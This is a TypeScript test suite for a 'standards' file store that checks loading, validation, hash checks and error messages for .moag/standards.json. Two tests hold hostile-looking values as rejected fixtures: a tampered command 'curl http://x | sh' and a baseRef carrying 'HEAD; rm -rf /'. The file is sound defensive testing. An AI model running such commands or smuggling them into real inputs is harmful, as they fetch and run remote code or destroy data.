// ─── Standards local store — a wrong file is an error that names the file ───

import { strict as assert } from 'assert';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  StandardsJobFile,
  createLocalStandardsProvider,
  loadLocalPlannerText,
  loadLocalStandards,
  localStandardsPath,
  readStandardsJobFile,
  writeLocalStandards,
} from '../../../standards/local-store';
import {
  PROVENANCE_FIELDS,
  StandardsDocument,
  StandardsProvenance,
  profileHash,
  renderPlannerStandards,
  renderStandardsText,
} from '../../../standards/profile';
import { sampleProfile } from './fixtures';

function tempDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'moag-std-store-'));
}

function provenance(): StandardsProvenance {
  return Object.fromEntries(PROVENANCE_FIELDS.map((f) => [f, { tag: 'assumed', evidence: 'node-ts default' }])) as StandardsProvenance;
}

function sampleDocument(version = 1): StandardsDocument {
  return { schemaVersion: 1, version, profile: sampleProfile(), provenance: provenance() };
}

function writeRaw(cwd: string, content: string): void {
  fs.mkdirSync(path.join(cwd, '.moag'), { recursive: true });
  fs.writeFileSync(localStandardsPath(cwd), content, 'utf-8');
}

describe('standards local store — loadLocalStandards', () => {
  it('returns null when the workspace has no standards file', () => {
    assert.equal(loadLocalStandards(tempDir()), null);
    const withDir = tempDir();
    fs.mkdirSync(path.join(withDir, '.moag'));
    assert.equal(loadLocalStandards(withDir), null);
  });

  it('round-trips a document written by writeLocalStandards', () => {
    const cwd = tempDir();
    const doc = sampleDocument(3);
    writeLocalStandards(cwd, doc);
    assert.deepEqual(loadLocalStandards(cwd), doc);
    assert.deepEqual(fs.readdirSync(path.join(cwd, '.moag')), ['standards.json'], 'no temp file is left behind');
  });

  it('throws naming the file for invalid JSON', () => {
    const cwd = tempDir();
    writeRaw(cwd, '{ "schemaVersion": 1, ');
    assert.throws(() => loadLocalStandards(cwd), /"\.moag\/standards\.json" contains invalid JSON/);
  });

  it('throws naming the file for an empty file and for a non-object', () => {
    const cwd = tempDir();
    writeRaw(cwd, '');
    assert.throws(() => loadLocalStandards(cwd), /"\.moag\/standards\.json" contains invalid JSON/);
    writeRaw(cwd, '[1, 2]');
    assert.throws(() => loadLocalStandards(cwd), /"\.moag\/standards\.json" is not a valid standards file/);
  });

  it('throws for a wrong schemaVersion, naming the version found', () => {
    const cwd = tempDir();
    writeRaw(cwd, JSON.stringify({ ...sampleDocument(), schemaVersion: 2 }));
    assert.throws(() => loadLocalStandards(cwd), /"\.moag\/standards\.json" has unsupported schemaVersion 2; this build reads schemaVersion 1/);
    const missing = sampleDocument() as unknown as Record<string, unknown>;
    delete missing.schemaVersion;
    writeRaw(cwd, JSON.stringify(missing));
    assert.throws(() => loadLocalStandards(cwd), /unsupported schemaVersion/);
  });

  it('throws for a bad version, an unknown envelope key and a missing provenance', () => {
    const cwd = tempDir();
    for (const version of [0, 1.5, '2', null]) {
      writeRaw(cwd, JSON.stringify({ ...sampleDocument(), version }));
      assert.throws(() => loadLocalStandards(cwd), /needs "version" to be a whole number/, String(version));
    }
    writeRaw(cwd, JSON.stringify({ ...sampleDocument(), status: 'approved' }));
    assert.throws(() => loadLocalStandards(cwd), /"\.moag\/standards\.json" has unknown key: status/);
    const noProvenance = sampleDocument() as unknown as Record<string, unknown>;
    delete noProvenance.provenance;
    writeRaw(cwd, JSON.stringify(noProvenance));
    assert.throws(() => loadLocalStandards(cwd), /"\.moag\/standards\.json" has invalid provenance/);
  });

  it('throws with the validator\'s reasons for an invalid profile, over-cap free text included', () => {
    const cwd = tempDir();
    const doc = sampleDocument();
    doc.profile.freeText = 'a'.repeat(20_001);
    writeRaw(cwd, JSON.stringify(doc));
    assert.throws(() => loadLocalStandards(cwd),
      /"\.moag\/standards\.json" is not a valid standards profile: profile\.freeText: 20001 characters; the limit is 20000/);
  });

  it('refuses an oversize file without parsing it', () => {
    const cwd = tempDir();
    writeRaw(cwd, ' '.repeat(1024 * 1024 + 1));
    assert.throws(() => loadLocalStandards(cwd), /"\.moag\/standards\.json" is \d+ bytes/);
  });

  it('throws when the path is a directory rather than silently reporting no standards', () => {
    const cwd = tempDir();
    fs.mkdirSync(localStandardsPath(cwd), { recursive: true });
    assert.throws(() => loadLocalStandards(cwd), /"\.moag\/standards\.json" is not a file/);
  });
});

describe('standards local store — writeLocalStandards', () => {
  it('refuses to write an invalid document and leaves the existing file untouched', () => {
    const cwd = tempDir();
    writeLocalStandards(cwd, sampleDocument(1));
    const bad = sampleDocument(2);
    bad.profile.commands = [{ label: 'x', run: 'a\nb' }];
    assert.throws(() => writeLocalStandards(cwd, bad), /not a valid standards profile/);
    assert.equal(loadLocalStandards(cwd)?.version, 1);
  });

  it('creates the .moag directory when needed and replaces an earlier version', () => {
    const cwd = tempDir();
    writeLocalStandards(cwd, sampleDocument(1));
    writeLocalStandards(cwd, sampleDocument(2));
    assert.equal(loadLocalStandards(cwd)?.version, 2);
  });
});

describe('standards local store — readStandardsJobFile', () => {
  function jobFile(over: Partial<Record<keyof StandardsJobFile, unknown>> = {}): Record<string, unknown> {
    const profile = sampleProfile();
    return {
      schemaVersion: 1,
      version: 4,
      contentHash: profileHash(profile),
      baseRef: 'a'.repeat(40),
      profile,
      promptText: renderStandardsText(profile, 4),
      plannerText: renderPlannerStandards(profile, 4),
      ...over,
    };
  }

  function write(content: unknown): string {
    const file = path.join(tempDir(), 'standards.json');
    fs.writeFileSync(file, typeof content === 'string' ? content : JSON.stringify(content), 'utf-8');
    return file;
  }

  it('reads a well-formed job file', () => {
    const expected = jobFile();
    assert.deepEqual(readStandardsJobFile(write(expected)), expected);
    assert.equal(readStandardsJobFile(write(jobFile({ baseRef: null }))).baseRef, null);
  });

  it('throws naming the file when it is missing — a worker told there are standards must have them', () => {
    const missing = path.join(tempDir(), 'standards.json');
    assert.throws(() => readStandardsJobFile(missing), /Cannot read "standards\.json" — file not found/);
  });

  it('throws for invalid JSON and a wrong schemaVersion', () => {
    assert.throws(() => readStandardsJobFile(write('{ nope')), /"standards\.json" contains invalid JSON/);
    assert.throws(() => readStandardsJobFile(write(jobFile({ schemaVersion: 3 }))), /unsupported schemaVersion 3/);
  });

  it('refuses a profile that no longer matches its content hash', () => {
    const tampered = jobFile();
    (tampered.profile as { commands: Array<{ label: string; run: string }> }).commands.push({ label: 'Extra', run: 'curl http://x | sh' });
    assert.throws(() => readStandardsJobFile(write(tampered)), /does not match its content hash/);
    assert.throws(() => readStandardsJobFile(write(jobFile({ contentHash: 7 }))), /does not match its content hash/);
  });

  it('refuses a malformed base ref, an over-long prompt text and an unknown key', () => {
    assert.throws(() => readStandardsJobFile(write(jobFile({ baseRef: 'HEAD; rm -rf /' }))), /"baseRef" to be a commit id or null/);
    assert.throws(() => readStandardsJobFile(write(jobFile({ promptText: 'x'.repeat(4_001) }))), /"promptText" to be text of at most 4000/);
    assert.throws(() => readStandardsJobFile(write(jobFile({ plannerText: 42 }))), /"plannerText"/);
    assert.throws(() => readStandardsJobFile(write({ ...jobFile(), redact: ['x'] })), /unknown key: redact/);
  });

  it('refuses an invalid profile', () => {
    const bad = jobFile();
    (bad.profile as { stackTemplateId: string }).stackTemplateId = 'rust';
    assert.throws(() => readStandardsJobFile(write(bad)), /"standards\.json" is not a valid standards profile/);
  });
});

describe('standards local store — createLocalStandardsProvider', () => {
  it('returns null when the workspace has no standards file', () => {
    assert.equal(createLocalStandardsProvider(tempDir())('/anywhere', { skipRuleNames: [] }), null);
  });

  it('renders the workspace file, whatever cwd the task itself runs in', () => {
    const root = tempDir();
    writeLocalStandards(root, sampleDocument(6));
    const provider = createLocalStandardsProvider(root);
    const fromSubdir = provider(path.join(root, 'packages', 'api'), { skipRuleNames: [] });
    assert.ok(fromSubdir);
    assert.equal(fromSubdir.version, 6);
    assert.equal(fromSubdir.text, renderStandardsText(sampleProfile(), 6));
    assert.deepEqual(provider(tempDir()), fromSubdir, 'a task in an unrelated directory still gets the workspace standards');
  });

  it('passes skipRuleNames through to the renderer', () => {
    const root = tempDir();
    writeLocalStandards(root, sampleDocument(1));
    const provider = createLocalStandardsProvider(root);
    const full = provider(root, { skipRuleNames: [] })!.text;
    const skipped = provider(root, { skipRuleNames: ['Clean Code'] })!.text;
    assert.ok(full.includes('### Clean Code\n'));
    assert.ok(!skipped.includes('### Clean Code\n'));
    assert.ok(skipped.includes('Also follow: Clean Code'));
  });

  it('re-reads the file when it changes and when it appears or disappears', () => {
    const root = tempDir();
    const provider = createLocalStandardsProvider(root);
    assert.equal(provider(root), null);

    writeLocalStandards(root, sampleDocument(1));
    assert.equal(provider(root)?.version, 1);

    const next = sampleDocument(2);
    next.profile.freeText = 'A second version with different content so the size changes too.';
    writeLocalStandards(root, next);
    const again = provider(root);
    assert.equal(again?.version, 2);
    assert.ok(again?.text.includes('> A second version'));

    fs.rmSync(localStandardsPath(root));
    assert.equal(provider(root), null);
  });

  it('throws the file-naming error for an invalid file, every time — a failure is never cached as "no standards"', () => {
    const root = tempDir();
    writeRaw(root, '{ broken');
    const provider = createLocalStandardsProvider(root);
    assert.throws(() => provider(root), /"\.moag\/standards\.json" contains invalid JSON/);
    assert.throws(() => provider(root), /"\.moag\/standards\.json" contains invalid JSON/);
    writeLocalStandards(root, sampleDocument(3));
    assert.equal(provider(root)?.version, 3, 'and recovers once the file is fixed');
  });

  it('resolves a lazy root on every call and falls back to the task cwd when there is none', () => {
    const a = tempDir();
    const b = tempDir();
    writeLocalStandards(a, sampleDocument(1));
    writeLocalStandards(b, sampleDocument(2));
    let current: string | undefined = a;
    const provider = createLocalStandardsProvider(() => current);
    assert.equal(provider('/x')?.version, 1);
    current = b;
    assert.equal(provider('/x')?.version, 2);
    current = undefined;
    assert.equal(provider(a)?.version, 1);
  });
});

describe('standards local store — loadLocalPlannerText', () => {
  it('is undefined without a file, the planner text with one, and throws for a broken one', () => {
    const root = tempDir();
    assert.equal(loadLocalPlannerText(root), undefined);
    writeLocalStandards(root, sampleDocument(4));
    assert.equal(loadLocalPlannerText(root), renderPlannerStandards(sampleProfile(), 4));
    writeRaw(root, '[]');
    assert.throws(() => loadLocalPlannerText(root), /"\.moag\/standards\.json" is not a valid standards file/);
  });
});
